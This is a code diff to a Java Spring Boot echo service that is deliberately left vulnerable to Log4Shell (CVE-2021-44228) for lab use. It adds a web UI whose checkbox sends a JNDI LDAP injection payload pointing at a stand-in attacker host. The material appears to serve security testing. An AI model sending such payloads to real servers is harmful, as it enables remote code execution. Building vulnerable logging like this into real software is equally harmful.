@@ -34,27 +34,81 @@ public class VulnerableEchoService {
         SpringApplication.run(VulnerableEchoService.class, args);
     }
     
-    @GetMapping("/")
-    public ResponseEntity<Map<String, Object>> home() {
+    // Web UI: input field + Echo button (calls /echo on the same origin).
+    @GetMapping(value = "/", produces = "text/html")
+    public String home() {
         long requestId = requestCounter.incrementAndGet();
-        logger.info("Home endpoint accessed - Request #{}", requestId);
-        
+        logger.info("UI home accessed - Request #{}", requestId);
+        return ECHO_UI;
+    }
+
+    // Original service info kept as JSON at /info for API consumers.
+    @GetMapping("/info")
+    public ResponseEntity<Map<String, Object>> info() {
         Map<String, Object> response = new HashMap<>();
         response.put("service", "Vulnerable Echo Service");
         response.put("version", "1.0.0-VULNERABLE");
         response.put("vulnerability", "CVE-2021-44228");
         response.put("endpoints", new String[]{
-            "GET / - Service info",
-            "GET /health - Health check", 
+            "GET / - Web UI",
+            "GET /info - Service info (JSON)",
+            "GET /health - Health check",
             "POST /echo - Echo message (VULNERABLE)",
             "GET /echo/{message} - Echo via GET (VULNERABLE)",
             "GET /echo?message=text - Echo via Query Parameter (VULNERABLE)"
         });
         response.put("timestamp", LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));
-        response.put("request_id", requestId);
-        
         return ResponseEntity.ok(response);
     }
+
+    private static final String ECHO_UI =
+        "<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'>"
+      + "<meta name='viewport' content='width=device-width, initial-scale=1'>"
+      + "<title>Echo Service</title><style>"
+      + "*{box-sizing:border-box;margin:0;padding:0}"
+      + "body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;"
+      + "background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);color:#e0e0e0;"
+      + "min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}"
+      + ".card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);"
+      + "border-radius:14px;padding:32px;max-width:640px;width:100%;backdrop-filter:blur(10px)}"
+      + "h1{color:#00d2ff;font-size:1.7em;text-shadow:0 0 18px rgba(0,210,255,.3)}"
+      + ".sub{color:#f39c12;font-family:monospace;font-size:.85em;margin:6px 0 22px}"
+      + "label{display:block;font-size:.85em;color:#8899a6;margin-bottom:6px;font-weight:600}"
+      + "input[type=text]{width:100%;padding:12px 14px;background:rgba(255,255,255,.08);"
+      + "border:1px solid rgba(255,255,255,.15);border-radius:8px;color:#e0e0e0;font-size:1em}"
+      + "input[type=text]:focus{outline:none;border-color:#00d2ff;box-shadow:0 0 0 2px rgba(0,210,255,.2)}"
+      + ".cb{display:flex;align-items:center;gap:8px;margin:16px 0;color:#e74c3c;font-size:.9em}"
+      + ".cb input{width:auto}"
+      + "button{margin-top:6px;padding:12px 26px;border:none;border-radius:8px;font-size:1em;"
+      + "font-weight:600;cursor:pointer;background:linear-gradient(135deg,#00d2ff,#0083b0);color:#fff}"
+      + "button:hover{filter:brightness(1.15)}"
+      + "pre{margin-top:22px;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08);"
+      + "border-radius:8px;padding:16px;white-space:pre-wrap;word-break:break-word;"
+      + "font-size:.85em;color:#7fe3ff;min-height:40px}"
+      + ".big{color:#2ecc71;font-size:1.05em;font-weight:600}"
+      + "</style></head><body><div class='card'>"
+      + "<h1>&#128225; Echo Service</h1>"
+      + "<div class='sub'>Log4j 2.14.1 &middot; CVE-2021-44228 &middot; lab use only</div>"
+      + "<label for='msg'>Message to echo</label>"
+      + "<input type='text' id='msg' placeholder='Type something and press Echo...' "
+      + "value='Hello from the Echo UI' onkeydown='if(event.key===\"Enter\")doEcho()'>"
+      + "<div class='cb'><input type='checkbox' id='vuln'>"
+      + "<label for='vuln' style='margin:0;color:#e74c3c'>include Log4j JNDI payload (X-Log4j-Test header)</label></div>"
+      + "<button onclick='doEcho()'>Echo</button>"
+      + "<pre id='out'>Response will appear here.</pre>"
+      + "</div><script>"
+      + "function doEcho(){"
+      + "var m=document.getElementById('msg').value||'Hello';"
+      + "var h={};"
+      + "if(document.getElementById('vuln').checked){h['X-Log4j-Test']='${jndi:ldap://attacker.com/exploit}';}"
+      + "var out=document.getElementById('out');out.textContent='...';"
+      + "fetch('/echo?message='+encodeURIComponent(m),{headers:h})"
+      + ".then(function(r){return r.json();}).then(function(d){"
+      + "out.innerHTML='<span class=\\'big\\'>Echoed: '+d.echoed_message+'</span>\\n\\n'"
+      + "+JSON.stringify(d,null,2).replace(/</g,'&lt;');})"
+      + ".catch(function(e){out.textContent='Error: '+e;});"
+      + "}"
+      + "</script></body></html>";
     
     @GetMapping("/health")
     public ResponseEntity<Map<String, Object>> health() {
